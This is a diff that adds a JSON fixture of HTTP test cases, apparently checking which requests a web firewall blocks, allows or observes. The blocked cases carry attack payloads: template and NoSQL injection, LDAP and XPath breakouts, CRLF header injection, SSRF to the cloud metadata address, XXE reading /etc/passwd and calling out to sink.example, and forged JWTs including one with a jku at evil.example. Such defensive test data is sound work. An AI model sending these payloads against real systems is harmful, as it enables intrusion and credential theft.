@@ -1,0 +1,295 @@
+[
+  {
+    "id": "ssti-jinja",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/ssti-jinja?q=%7B%7B7*7%7D%7D"
+  },
+  {
+    "id": "ssti-freemarker",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/ssti-freemarker?tpl=%3C%23assign%20x%3D1%3E"
+  },
+  {
+    "id": "ssti-velocity",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/ssti-velocity?tpl=%23set(%24x%3D1)"
+  },
+  {
+    "id": "ssti-benign-expression",
+    "expect": "allow",
+    "method": "GET",
+    "target": "/common/ssti-benign-expression?tpl=%7B%7B%20user.name%20%7D%7D"
+  },
+  {
+    "id": "ssti-benign-prose",
+    "expect": "allow",
+    "method": "GET",
+    "target": "/common/ssti-benign-prose?doc=Use%20%7B%7Bname%7D%7D%20in%20the%20template"
+  },
+  {
+    "id": "nosql-mongo-operators",
+    "expect": "block",
+    "method": "POST",
+    "target": "/common/nosql-mongo-operators",
+    "body": "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+    "headers": {
+      "Content-Type": "application/json"
+    }
+  },
+  {
+    "id": "nosql-where-clause",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/nosql-where-clause?filter=%24where%3A1"
+  },
+  {
+    "id": "nosql-benign-comparison",
+    "expect": "allow",
+    "method": "GET",
+    "target": "/common/nosql-benign-comparison?filter=price%3E100"
+  },
+  {
+    "id": "ldap-filter-breakout",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/ldap-filter-breakout?user=%2A%29%28uid%3D%2A"
+  },
+  {
+    "id": "ldap-operator-chain",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/ldap-operator-chain?filter=%7C(uid%3D%2A"
+  },
+  {
+    "id": "ldap-benign-filter",
+    "expect": "allow",
+    "method": "GET",
+    "target": "/common/ldap-benign-filter?filter=(uid=alice)"
+  },
+  {
+    "id": "xpath-predicate-breakout",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/xpath-predicate-breakout?user=%27%5D%2F%2F*"
+  },
+  {
+    "id": "xpath-blind-function",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/xpath-blind-function?user=count(%2F*)"
+  },
+  {
+    "id": "xpath-benign-predicate",
+    "expect": "allow",
+    "method": "GET",
+    "target": "/common/xpath-benign-predicate?book=%2Fbookstore%2Fbook%5Bprice%3E30%5D"
+  },
+  {
+    "id": "php-deserialization",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/php-deserialization?data=O%3A8%3A%22stdClass%22%3A0%3A%7B%7D"
+  },
+  {
+    "id": "java-deserialization",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/java-deserialization?data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA"
+  },
+  {
+    "id": "python-deserialization",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/python-deserialization?data=gASVAAAAAAAAAAAAAAAAAAAA"
+  },
+  {
+    "id": "ruby-deserialization",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/ruby-deserialization?data=BAh7AAAAAAAAAAAAAAAAAAAA"
+  },
+  {
+    "id": "deserialization-benign-prefix",
+    "expect": "allow",
+    "method": "GET",
+    "target": "/common/deserialization-benign-prefix?note=The%20prefix%20O%3A8%20is%20documentation"
+  },
+  {
+    "id": "crlf-query",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/crlf-query?next=%2Fhome%0d%0aSet-Cookie:%20admin=1"
+  },
+  {
+    "id": "crlf-benign-query",
+    "expect": "allow",
+    "method": "GET",
+    "target": "/common/crlf-benign-query?next=%2Fhome%3Ftab%3D1"
+  },
+  {
+    "id": "ssrf-metadata",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/ssrf-metadata?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
+  },
+  {
+    "id": "ssrf-loopback",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/ssrf-loopback?url=http%3A%2F%2F127.0.0.1%3A8080%2F"
+  },
+  {
+    "id": "ssrf-decimal",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/ssrf-decimal?url=http%3A%2F%2F2130706433%2F"
+  },
+  {
+    "id": "ssrf-protocol-relative",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/ssrf-protocol-relative?url=%2F%2F127.0.0.1%2Fadmin"
+  },
+  {
+    "id": "ssrf-benign-public",
+    "expect": "allow",
+    "method": "GET",
+    "target": "/common/ssrf-benign-public?url=https%3A%2F%2Fexample.com%2Favatar.png"
+  },
+  {
+    "id": "xxe-file",
+    "expect": "block",
+    "method": "POST",
+    "target": "/common/xxe-file",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "headers": {
+      "Content-Type": "application/xml"
+    }
+  },
+  {
+    "id": "xxe-oob",
+    "expect": "block",
+    "method": "POST",
+    "target": "/common/xxe-oob",
+    "body": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://sink.example/leak\"> %xxe;]>",
+    "headers": {
+      "Content-Type": "application/xml"
+    }
+  },
+  {
+    "id": "xxe-benign",
+    "expect": "allow",
+    "method": "POST",
+    "target": "/common/xxe-benign",
+    "body": "<?xml version=\"1.0\"?><note><to>alice</to></note>",
+    "headers": {
+      "Content-Type": "application/xml"
+    }
+  },
+  {
+    "id": "jwt-none",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/jwt-none?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."
+  },
+  {
+    "id": "jwt-kid-traversal",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/jwt-kid-traversal?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiJhZG1pbiJ9.c2ln"
+  },
+  {
+    "id": "jwt-jku-external",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/jwt-jku-external?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9ldmlsLmV4YW1wbGUvandrcy5qc29uIn0.eyJzdWIiOiJhZG1pbiJ9.c2ln"
+  },
+  {
+    "id": "jwt-missing-signature",
+    "expect": "block",
+    "method": "GET",
+    "target": "/common/jwt-missing-signature?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIn0"
+  },
+  {
+    "id": "jwt-benign",
+    "expect": "allow",
+    "method": "GET",
+    "target": "/common/jwt-benign?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIn0.c2ln"
+  },
+  {
+    "id": "jwt-alg-confusion",
+    "expect": "observe",
+    "method": "GET",
+    "target": "/common/jwt-alg-confusion?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.c2ln"
+  },
+  {
+    "id": "mass-assignment",
+    "expect": "observe",
+    "method": "POST",
+    "target": "/common/mass-assignment",
+    "body": "name=Alice&role=admin&is_admin=true",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    }
+  },
+  {
+    "id": "oauth-redirect-uri",
+    "expect": "observe",
+    "method": "GET",
+    "target": "/common/oauth-redirect-uri?redirect_uri=https%3A%2F%2Fevil.example%2Fcb&response_type=code"
+  },
+  {
+    "id": "bola-sequential-id",
+    "expect": "observe",
+    "method": "GET",
+    "target": "/common/bola-sequential-id?order_id=1002",
+    "headers": {
+      "X-User": "alice"
+    }
+  },
+  {
+    "id": "hpp-role",
+    "expect": "observe",
+    "method": "GET",
+    "target": "/common/hpp-role?role=user&role=admin"
+  },
+  {
+    "id": "json-duplicate-role",
+    "expect": "observe",
+    "method": "POST",
+    "target": "/common/json-duplicate-role",
+    "body": "{\"role\":\"user\",\"role\":\"admin\"}",
+    "headers": {
+      "Content-Type": "text/plain"
+    }
+  },
+  {
+    "id": "graphql-introspection",
+    "expect": "observe",
+    "method": "POST",
+    "target": "/graphql",
+    "body": "{\"query\":\"{__schema{types{name}}}\"}",
+    "headers": {
+      "Content-Type": "application/json"
+    }
+  },
+  {
+    "id": "benign-api",
+    "expect": "allow",
+    "method": "GET",
+    "target": "/common/benign-api?user=alice"
+  },
+  {
+    "id": "benign-profile-json",
+    "expect": "allow",
+    "method": "POST",
+    "target": "/common/benign-json",
+    "body": "{\"name\":\"Alice\",\"role\":\"user\"}",
+    "headers": {
+      "Content-Type": "application/json"
+    }
+  }
+]
